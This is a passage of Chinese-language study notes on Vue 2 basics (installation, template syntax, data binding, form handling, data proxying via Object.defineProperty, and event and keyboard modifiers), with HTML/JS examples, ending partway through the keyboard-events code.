> [https://www.bilibili.com/video/BV1Zy4y1K7SH](https://www.bilibili.com/video/BV1Zy4y1K7SH)
> 
> [尚硅谷_前端技术_Vue全家桶.pdf](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F尚硅谷_前端技术_Vue全家桶.pdf)

# 一、Vue 简介

## 1、官网

1. 英文官网: [https://vuejs.org/](https://vuejs.org/)
2. vue 2.x 中文官网：[https://v2.cn.vuejs.org/v2/guide/index.html](https://v2.cn.vuejs.org/v2/guide/index.html)
3. vue 3.x 中文官网：[https://cn.vuejs.org/guide/introduction.html](https://cn.vuejs.org/guide/introduction.html)

## 2、介绍与描述

1.  动态构建用户界面的渐进式 JavaScript 框架
2. 作者: 尤雨溪  

## 3、Vue 的特点

1. 遵循 MVVM 模式
2. 编码简洁, 体积小, 运行效率高, 适合移动/PC 端开发
3. 它本身只关注 UI, 也可以引入其它第三方库开发项目

## 4、与其它 JS 框架的关联

1. 借鉴 Angular 的模板和数据绑定技术
2. 借鉴 React 的组件化和虚拟 DOM 技术

## 5、Vue 周边库

1. vue-cli：vue 脚手架
2. vue-resource
3. axios
4. vue-router：路由
5. vuex：状态管理
6. element-ui：基于 vue 的 UI 组件库(PC 端)
7. ...

# 二、Vue 初识

## 1、搭建 vue 开发工具

> [https://v2.cn.vuejs.org/v2/guide/installation.html](https://v2.cn.vuejs.org/v2/guide/installation.html)

1. 在上面的链接中下载开发版本

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-53-889--OLjDsIjjhoYC5w.png)

2. 在 html 文件中引入

```bash
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>
<body>
    
</body>
</html>
```

3. 浏览器打开，会有两个提示，正常的；下面添加开发者工具

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-54-491--qleHOu3jo9jJrg.png)

4. 如果是 edge 或 谷歌浏览器，github 打不开的话， 可以安装插件：`Vue.js devtools`

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-54-507--oQstZfW-unUa-A.png)

5. 点击插件 --> 详细信息，允许访问文件 URL

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-54-527--k_dZ5afdwF5vnw.png)

6. 开发者工具提示消失

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-54-687--D2DUD3Wd8WHONQ.png)

7. 修改 `productionTip` 属性

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>
<body>
    
</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

</script>

</html>
```

8. 开发版提示消失

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-54-782--qsQrpkLVtwex3w.png)

## 2、Hello World 小案例

1. 想让 Vue 工作，就必须创建一个 Vue 实例，且要传入一个配置对象
2. root 容器里的代码依然符合 html 规范，只不过混入了一些特殊的 Vue 语法
3. root 容器里的代码被称为：Vue 模板
4. Vue 实例和容器是一一对应的
5. 真实开发中只有一个 Vue 实例，并且会配合着组件一起使用
6. vue 容器内 `{{name}}` 称为插值表达式，其中要写要写 js 表达式，且可以自动读取到 data 中的所有属性；
7. 一旦 data 中的数据发生改变，那么页面中用到该数据的地方也会自动更新；

- 注意区分：js表达式 和 js 代码(语句)
   - 表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方：
      - `a`
      - `a+b`
      - `demo(1)`
      - `x === y ? 'a' : 'b'`
   - js代码(语句)
      - `if(){}`
      - `for(){}`

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>
<body>
    
    <!-- 准备一个 vue 容器 -->
    <div id="root">
        <h1>Hello World {{name}}</h1>
    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    // 1、创建 vue 实例
    new Vue({
        // 2、el 用于指定当前 vue 实例为哪个容器服务，值通常为 css 选择器字符串
        el: '#root',
        // 3、data 中用于存储数据，数据供 el 所指定的容器去使用
        data: {
            name: '月海'
        }
    });

</script>

</html>
```

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-54-926--vNV2Rv35LCHWKg.png)

## 3、模板语法 `{{}}`

- Vue 模板语法有2大类：
1. 插值语法：
   1. 功能：用于解析标签体内容。
   2. 写法：`{{xxx}}`，`xxx` 是 js 表达式，且可以直接读取到 data 中的所有属性。
2. 指令语法：
   1. 功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）。
   2. 举例：`v-bind:href="xxx"` 或  简写为 `:href="xxx"`，`xxx` 同样要写 js 表达式，且可以直接读取到 data 中的所有属性。
   3. 备注：Vue 中有很多的指令，且形式都是：`v-????`，此处我们只是拿 `v-bind` 举个例子。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>
<body>
    
    <!-- 准备一个 vue 容器 -->
    <div id="root">
        <!-- 插值语法 -->
        <p>插值语法： {{name}}</p>
        <!-- 指令语法；这个 : 是简写，原始写法是：v-bind:href=""，绑定 -->
        <p>指令语法： <a :href="bilibiliURL">进入二次元</a></p>
        <!-- v-bind:href="" ：引号中的会被当做 js 表达式来执行：如，将 bilibiliURL 的值变为大写 -->
        <p>指令语法： <a :href="bilibiliURL.toUpperCase()">进入二次元</a></p>
    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    // 创建 vue 实例
    new Vue({
        // el 用于指定当前 vue 实例为哪个容器服务，值通常为 css 选择器字符串
        el: '#root',
        // data 中用于存储数据，数据供 el 所指定的容器去使用
        data: {
            name: '月海',
            bilibiliURL: 'https://www.bilibili.com/'
        }
    });

</script>

</html>
```

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-55-015--6U3yFk7X4qAm-A.png)

## 4、数据绑定 `data、v-bind、v-model`

### ①、一般使用

- Vue 中有 2 种数据绑定的方式：
1. 单向绑定 `v-bind:属性名`，简写：`:属性名`：数据只能从 data 流向页面
2. 双向绑定 `v-model:属性名`，简写：`v-model`：数据不仅能从 data 流向页面，还可以从页面流向 data，一般绑定属性中的 `value`
3. 备注：
   1. 双向绑定一般都应用在表单类元素上（如：input、select 等）
   2. `v-model:value` 可以简写为 `v-model`，因为 `v-model` 默认收集的就是 `value` 值

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>
<body>
    
    <!-- 准备一个 vue 容器 -->
    <div id="root">
        <!-- v-bind：单向数据绑定 -->
        <p>单向数据绑定：<input type="text" :value="name"></p>
        <!-- v-model：双向数据绑定 -->
        <p>双向数据绑定：<input type="text" v-model="bilibiliURL"></p>
    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    // 创建 vue 实例
    new Vue({
        // el 用于指定当前 vue 实例为哪个容器服务，值通常为 css 选择器字符串
        el: '#root',
        // data 中用于存储数据，数据供 el 所指定的容器去使用
        data: {
            name: '月海',
            bilibiliURL: 'https://www.bilibili.com/'
        }
    });

</script>

</html>
```

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-55-123--X6vOSQsCYMFDhQ.png)

### ②、收集表单数据

1. 若：`<input type="text"/>`，则 `v-model` 收集的是 `value` 值，用户输入的就是 `value` 值。
2. 若：`<input type="radio"/>`，则 `v-model` 收集的是 `value` 值，且要给标签配置 `value` 值。
3. 若：`<input type="checkbox"/>`
   1. 没有配置 `input` 的 `value` 属性，那么收集的就是 `checked`（勾选 or 未勾选，是布尔值）
   2. 配置 `input` 的 `value` 属性
      1. `v-model` 的初始值是非数组，那么收集的就是 `checked`（勾选 or 未勾选，是布尔值）
      2. `v-model` 的初始值是数组，那么收集的的就是 `value` 组成的数组
4. 备注：`v-model` 的三个修饰符：
   1. `lazy`：失去焦点再收集数据
   2. `number`：输入字符串转为有效的数字
   3. `trim`：输入首尾空格过滤

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>

<body>
    <!-- 给表单绑定表单提交事件，并阻止默认事件 -->
    <div id="root" @submit.prevent="submit">
        <form>
            <!-- v-model.trim：去掉前后的空格 -->
            账号：<input type="text" v-model.trim="userInfo.username"><br/>
            密码：<input type="password" v-model.trim="userInfo.password"><br/>
            <!-- type="number"：输入的只能是数字     v-model.number：将输入的字符变为数字 -->
            年龄：<input type="number" v-model.number="userInfo.age">
            性别：
                <!-- v-model 是 v-model:value 的简写形式，获取的是 value 的值，所以要写 value 属性 -->
                1<input type="radio" name="sex" value="1" v-model="userInfo.sex"> 
                0<input type="radio" name="sex" value="0" v-model="userInfo.sex"><br/>
            爱好：
                <!-- checkbox 多选框对应数组，选中后 value 属性的值会赋值给数组 -->
                学习<input type="checkbox" v-model="userInfo.hobby" value="study">
                吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
                打游戏<input type="checkbox" v-model="userInfo.hobby" value="game"><br/>
            所属校区
                <!-- 单选下拉框 -->
				<select v-model="userInfo.city">
					<option value="">请选择校区</option>
					<option value="beijing">北京</option>
					<option value="shanghai">上海</option>
					<option value="shenzhen">深圳</option>
					<option value="wuhan">武汉</option>
				</select>
				<br/><br/>
            爱好2
                <!-- 多选下拉框 -->
				<select multiple v-model="userInfo.hobby2">
					<option value="">请选择校区</option>
					<option value="study">学习</option>
					<option value="eat">吃饭</option>
					<option value="game">打游戏</option>
				</select>
				<br/><br/>
            其他信息：
            <!-- v-model.lazy：失去焦点时触发数据绑定 -->
            <textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
            <input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="https://www.bilibili.com/">《用户协议》</a>
            <button>提交</button>
        </form>
    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    const vm = new Vue({
        el: '#root',
        // 数据
        data: {
            // 放到一个对象里，便于使用
            userInfo: {
                username: '',
                password: '',
                age: '',
                // 给 sex 设置初始值，单选框也会默认选择
                sex: '1',
                // 给 hobby 设置初始值，多选框也会默认选择
                hobby: ['study', 'eat'],
                city: '',
                hobby2: [],
                other: '',
                // 字符串也可以
                agree: true
            }
        },
        methods: {
            submit(){
            	console.log(JSON.stringify(this.userInfo))
            }
        }
    });

</script>

</html>
```

## 5、MVVM 模型

虽然 vue 没有完全遵循 [MVVM 模型](https://zh.wikipedia.org/wiki/MVVM)，但是 Vue 的设计也受到了它的启发。因此在文档中经常会使用 vm (ViewModel 的缩写) 这个变量名表示 Vue 实例

1. M：模型(Model) ：对应 data 中的数据
2. V：视图(View) ：模板
3. VM：视图模型(ViewModel) ： Vue 实例对象

---

1. data 中所有的属性，最后都出现在了 vm 身上
2. vm 身上所有的属性 及 Vue 原型上所有属性，在 Vue 模板中都可以直接使用.

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-55-229--GZv28vJRTMnhNA.png)

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-55-419--JhZEIu3HWzzIrA.png)

## 6、数据代理 `defineProperty()`

### ①、`Object.defineProperty()` 方法

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <!-- <script src="../js/vue.js"></script> -->
</head>
<body>
    
    <h2>数据代理</h2>
    <button id="btn">点击</button>

</body>

<script>

    // 定义一个对象
    const yuehai = {
        name:"月海",
        age:16
    }
    console.log(yuehai);

    // 获取元素对象
    const btn = document.querySelector("#btn")
    // 绑定单击事件
    btn.addEventListener("click",function(){

        // 调用 Object.defineProperty() 方法，给对象添加属性
        // 参数 1、要处理的对象
        // 参数 2、要添加的属性
        // 参数 3、配置项
        Object.defineProperty(yuehai, 'sex', {
            // 添加的属性的值（默认不可以被枚举，不参与遍历）
            value: 0,
            // 控制属性是否可以枚举，默认值是 false
            enumerable: true,
            // 控制属性是否可以修改，默认值是 false
            writable: true,
            // 控制属性是否可以删除，默认值是 false
            configurable: true,
        })

        Object.defineProperty(yuehai, 'play', {
            // 当有人读取 yuehai 的 play 属性时，get函数（getter）就会被调用，且返回值就是 play 的值 
            get(){
                console.log('有人读取 play 属性');
                return '玩月海'
            },
            // 当有人修改 yuehai 的 play 属性时，set函数（setter）就会被调用，且会收到修改的具体值
            set(value){
                console.log('要修改的值是：' , value);
            }
        })

        console.log(yuehai);
        // 遍历对象的属性名，变成数组（验证 Object.defineProperty() 是否可枚举）
        console.log(Object.keys(yuehai));

    })

</script>

</html>
```

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-55-555--YoLSMmv-1ZsS6A.png)

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-55-694--ZsbGW889uAeZuQ.png)

### ②、理解数据代理

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    
    <h2>数据代理</h2>
    <button id="btn">点击</button>

</body>

<script>

    // 定义两个对象
    const a = { a: 1 }
    const b = { b: 10 }

    console.log(a);
    console.log(b);

    // 获取元素对象
    const btn = document.querySelector("#btn")
    // 绑定单击事件
    btn.addEventListener("click",function(){

        // 数据代理：通过一个对象代理对另一个对象中属性的操作（读/写）
        Object.defineProperty(a, 'b', {
            get(){
                return b.b
            },
            set(value){
                b.b = value;
            }
        })

        console.log(a);
        console.log(b);

    })

</script>

</html>
```

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-55-831--ZOY1kIxpjJ2njA.png)

### ③、vue 的数据代理

1. Vue 中的数据代理：通过 vm 对象来代理 data 对象中属性的操作（读/写）
2. Vue 中数据代理的好处：更加方便的操作 data 中的数据
3. 基本原理：
   1. 通过 `Object.defineProperty()` 把 data 对象中所有属性添加到 vm 上。
   2. 为每一个添加到 vm 上的属性，都指定一个 getter/setter。
   3. 在 getter/setter 内部去操作（读/写）data 中对应的属性。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>
<body>
    
    <!-- 准备一个 vue 容器 -->
    <div id="root">
        <p>{{name}}</p>
    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    // 创建 vue 实例，并将实例赋值给 v
    const v = new Vue({
        // el 用于指定当前 vue 实例为哪个容器服务，值通常为 css 选择器字符串
        el: '#root',
        // data 中用于存储数据，数据供 el 所指定的容器去使用
        data: {
            name: '月海',
            bilibiliURL: 'https://www.bilibili.com/'
        }
    });

    console.log(v);

</script>

</html>
```

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-55-968--O74sjnQWEG5tYQ.png)

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-56-183--r60SJXx3QjNQPw.png)

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-56-328--XK2rb290hs4EfA.png)

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-56-415--VqCL9_gyQTWhEQ.png)

## 7、事件处理 `methods、v-on、@`

### ①、事件的基本使用

1. 使用 `v-on:xxx` 或 `@xxx `绑定事件，其中 `xxx` 是事件名
2. 事件的回调需要配置在 `methods` 对象中，最终会在 vm 上
3. methods 中配置的函数，不要用箭头函数！否则 this 就不是 vm 了
4. methods 中配置的函数，都是被 Vue 所管理的函数，this 的指向是 vm 或 组件实例对象
5. `@click="demo"` 和 `@click="demo($event)"` 效果一致，但后者可以传参
6. 函数不传递参数，则可以接收事件对象；一旦传递参数就不能接收事件对象：解决办法：传递参数时同时传递 `$event`
7. 若参数 `$event` 是最后一个传递的参数，则函数形参不用定义；若不是最后一个，则需要定义

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>
<body>
    
    <!-- 准备一个 vue 容器 -->
    <div id="root">
        <p>{{name}}</p>
        <!-- 使用v-on:xxx 或 @xxx 绑定事件，其中 xxx 是事件名 -->
        <!-- @click="demo" 和 @click="demo($event)" 效果一致，但后者可以传参 -->
        <!-- $event：vue 定义的事件对象； 若参数 $event 是最后一个传递的参数，则函数形参不用定义；若不是最后一个，则需要定义 -->
        <button v-on:click="showInfo">点击</button>
        <button @click="showInfo2(2)">点击2</button></br>
        <button @click="showInfo3(3, $event)">点击3</button>
        <button @click="showInfo4($event, 4)">点击3</button>
    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    // 创建 vue 实例，并将实例赋值给 v
    const v = new Vue({
        // el 用于指定当前 vue 实例为哪个容器服务，值通常为 css 选择器字符串
        el: '#root',
        // data 中用于存储数据，数据供 el 所指定的容器去使用
        data: {
            name: '月海',
            bilibiliURL: 'https://www.bilibili.com/'
        },

        // 事件的回调需要配置在 methods 对象中，最终会在 vm 上
        // methods 中配置的函数，不要用箭头函数！否则 this 就不是 vm 了
        // methods 中配置的函数，都是被 Vue 所管理的函数，this 的指向是 vm 或 组件实例对象
        methods: {
            showInfo() {
                console.log('月海');
            },
            showInfo2(num) {
                console.log(num);
                console.log(event);
            },
            showInfo3(num) {
                console.log(num);
                console.log(event.target);
            },
            showInfo4(event, num) {
                console.log(num);
                console.log(event.target);
            }
        }
    });

</script>

</html>
```

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-56-616--t0rXtPGCu6iscA.png)

### ②、事件修饰符

1. `prevent`：阻止默认事件（常用)
2. `stop`：阻止事件冒泡（常用）
3. `once`：事件只触发一次（常用）
4. `capture`：使用事件的捕获模式；先捕获后冒泡；捕获是从外向里，冒泡是从里向外
5. `self`：只有 event.target 是当前操作的元素时才触发事件
6. `passive`：事件的默认行为立即执行，无需等待事件回调执行完毕
7. 事件修饰符可以连续调用：`xxx.prevent.stop`

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>
<body>
    
    <!-- 准备一个 vue 容器 -->
    <div id="root">
        <p>{{name}}</p>

        <!-- prevent：阻止默认事件（常用) -->
        <a :href="bilibiliURL" @click.prevent="showInfo"><button>prevent</button></a>

        <!-- stop：阻止事件冒泡（常用) -->
        <div @click="showInfo">
            <button @click.stop="showInfo">stop</button>
        </div>

        <!-- once：事件只触发一次(常用)：比如函数只有第一次点击会执行 -->
        <button @click.once="showInfo">once</button>
        
        <!-- capture：使用事件的捕获模式：先捕获后冒泡；捕获是从外向里，冒泡是从里向外 -->
        <div @click.capture="showMsg(1)">
            <button @click="showMsg(2)">capture</button>
        </div>

        <!-- self：只有 event.target 是当前操作的元素时才触发事件 -->
        <!-- 此时 self 添加在 div 元素上，我点击 btn 按钮，div 的点击事件不会触发，因为 div 元素不是当前操作的元素(btn) -->
        <div @click.self="showMsg(1)">
            <button @click="showMsg(2)">self</button>
        </div>

        <!-- passive：事件的默认行为立即执行，无需等待事件回调执行完毕 -->
        <!-- 
            在无序列表上滚动滑轮，调用 showNum 函数；
            若不加，等函数的回调执行完毕才会执行默认事件（滚动条滚动)
            加上了，滚动条马上就会滚动
        -->
        <ul @wheel="showNum" style="height: 50px; background-color: skyblue; overflow: auto;">
            <li>1</li>
            <li>2</li>
            <li>3</li>
            <li>4</li>
        </ul>

    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    // 创建 vue 实例，并将实例赋值给 v
    const v = new Vue({
        // el 用于指定当前 vue 实例为哪个容器服务，值通常为 css 选择器字符串
        el: '#root',
        // data 中用于存储数据，数据供 el 所指定的容器去使用
        data: {
            name: '月海',
            bilibiliURL: 'https://www.bilibili.com/'
        },
        // 函数
        methods: {
            showInfo() {
                alert('月海')
            },
            showMsg(num){
                console.log(num);
            },
            showNum(){
                for (let i = 0; i < 100000; i++) {
                    console.log("1");
                }
            }
        }
    });

</script>

</html>
```

### ③、键盘事件

1. 1.Vue中常用的按键别名：
   1. 回车 => enter
   2. 删除 => delete (捕获“删除”和“退格”键)
   3. 退出 => esc
   4. 空格 => space
   5. 换行 => tab (特殊，必须配合keydown去使用)
   6. 上 => up
   7. 下 => down
   8. 左 => left
   9. 右 => right
2. Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）
3. 系统修饰键（用法特殊）：ctrl、alt、shift、meta（win键)
   1. 配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
   2. 配合keydown使用：正常触发事件。
4. 也可以使用keyCode去指定具体的按键（不推荐）
5. Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名
6. 可指定多个按键：`xxx.ctrl.y`

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>
<body>
    
    <!-- 准备一个 vue 容器 -->
    <div id="root">
        <!-- keydown：按键按下事件；keyup：按键抬起事件；自己在函数里判断是否按下了回车 -->
        <input type="text" @keyup="showInfo">
        <!-- 
            1.Vue中常用的按键别名：
                        回车 => enter
                        删除 => delete (捕获“删除”和“退格”键)
                        退出 => esc
                        空格 => space
                        换行 => tab (特殊，必须配合keydown去使用)
                        上 => up
                        下 => down
                        左 => left
                        右 => right

            2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）

            3.系统修饰键（用法特殊）：ctrl、alt、shift、meta（win键)
                        (1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
                        (2).配合keydown使用：正常触发事件。

            4.也可以使用keyCode去指定具体的按键（不推荐）

            5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名
		-->
        <!-- 回车 => enter；按回车按钮才会触发事件 -->
        <input type="text" @keyup.enter="showInfo2">

        <!-- 切换大小写 => caps-lock；按切换大小写按钮才会触发事件 -->
        <input type="text" @keyup.caps-lock="showInfo2">

        <!-- 使用自定义的按键别名 -->
        <input type="text" @keyup.huiche="showInfo2">

    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    // 定义了一个按键别名，key 是 13，也就是回车
